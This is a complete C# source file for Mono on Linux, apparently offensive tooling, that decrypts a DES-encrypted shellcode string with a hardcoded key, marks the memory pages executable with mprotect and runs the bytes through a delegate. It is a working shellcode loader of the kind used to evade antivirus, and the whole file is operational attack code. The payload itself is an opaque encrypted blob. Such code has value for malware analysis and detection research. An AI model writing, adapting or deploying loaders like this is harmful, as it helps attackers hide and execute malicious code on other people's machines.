﻿// C# shellcode decrypter using DES 
//
// Build command:
//     mcs -reference:Mono.Posix decrypter.cs 
//
// Author: Oleg Mitrofanov (reider-roque) 2015

using System;
using System.Runtime.InteropServices;
using Mono.Unix.Native;
using System.Security.Cryptography;

class MainClass
{
	private static String shellcodeStrEncrypted = "\x92\x23\xAD\xAF\x0F\x87\xF0"
		+ "\x43\x93\xDA\x66\x62\xC4\x98\x2C\xFE\x33\x25\x89\x35\x1C\xC2\xB7\xD1";
	private static Byte[] key = new Byte[8] {1, 2, 3, 4, 5, 6, 7, 8};
	private static Byte[] iv = new Byte[8] {1, 2, 3, 4, 5, 6, 7, 8};

	private static Int32 PAGE_SIZE = 
		(Int32)Mono.Unix.Native.Syscall.sysconf(SysconfName._SC_PAGESIZE);

	private static void Main(string[] args)
	{
		Byte[] shellcodeBytesEncrypted = ToShellcodeBytes(shellcodeStrEncrypted);
		Byte[] shellcodeBytesDecrypted = Decrypt(shellcodeBytesEncrypted);

		ExecShellcode(shellcodeBytesDecrypted);
	}

	private static Byte[] ToShellcodeBytes(String shellcode)
	{
		Byte[] sc_bytes = new Byte[shellcode.Length];
		for (Int32 i = 0; i < shellcode.Length; i++) 
		{
			sc_bytes [i] = (Byte) shellcode [i];
		}

		return sc_bytes;
	}

	public static Byte[] Decrypt(Byte[] inputBuffer)
	{
		SymmetricAlgorithm algorithm = DES.Create();
		ICryptoTransform transform = algorithm.CreateDecryptor(key, iv);
		Byte[] outputBuffer = transform.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length);

		return outputBuffer;
	}

	private static IntPtr GetPageBaseAddress(IntPtr p)
	{
		return (IntPtr)((Int32)p & ~(PAGE_SIZE - 1));
	}

	private static void MakeMemoryExecutable(IntPtr pagePtr)
	{
		var mprotectResult = Syscall.mprotect (pagePtr, (ulong)PAGE_SIZE, 
			MmapProts.PROT_EXEC | MmapProts.PROT_WRITE);

		if (mprotectResult != 0) 
		{
			Console.WriteLine ("Error: mprotect failed to make page at 0x{0} " +
				"address executable! Result: {1}, Errno: {2}", mprotectResult, 
				Syscall.GetLastError ());
			Environment.Exit (1);
		}
	}

	private delegate void ShellcodeFuncPrototype();

	private static void ExecShellcode(Byte[] shellcodeBytes)
	{
		// Prevent garbage collector from moving the shellcode byte array
		GCHandle pinnedByteArray = GCHandle.Alloc(shellcodeBytes, GCHandleType.Pinned);

		// Get handle for shellcode address and address of the page it is located in
		IntPtr shellcodePtr = pinnedByteArray.AddrOfPinnedObject();
		IntPtr shellcodePagePtr = GetPageBaseAddress(shellcodePtr);
		Int32 shellcodeOffset = (Int32)shellcodePtr - (Int32)shellcodePagePtr;
		Int32 shellcodeLen = shellcodeBytes.GetLength (0);

		// Some debugging information
		Console.WriteLine ("Page Size: {0}", PAGE_SIZE.ToString ());
		Console.WriteLine ("Shellcode address: 0x{0}", shellcodePtr.ToString("x"));
		Console.WriteLine ("First page start address: 0x{0}", 
			shellcodePagePtr.ToString("x"));
		Console.WriteLine ("Shellcode offset: {0}", shellcodeOffset);
		Console.WriteLine ("Shellcode length: {0}", shellcodeLen);

		// Make shellcode memory executable
		MakeMemoryExecutable(shellcodePagePtr);

		// Check if shellcode spans across more than 1 page; make all extra pages
		// executable too
		Int32 pageCounter = 1;
		while (shellcodeOffset + shellcodeLen > PAGE_SIZE) 
		{
			shellcodePagePtr = 
				GetPageBaseAddress(shellcodePtr + pageCounter * PAGE_SIZE);
			pageCounter++;
			shellcodeLen -= PAGE_SIZE;

			MakeMemoryExecutable(shellcodePagePtr);
		}

		// Debug information
		Console.WriteLine ("Pages taken by the shellcode: {0}",
			pageCounter);

		// Make shellcode callable by converting pointer to delegate
		ShellcodeFuncPrototype shellcode_func = 
			(ShellcodeFuncPrototype) Marshal.GetDelegateForFunctionPointer(
				shellcodePtr, typeof(ShellcodeFuncPrototype));

		shellcode_func(); // Execute shellcode

		pinnedByteArray.Free();
	}
}
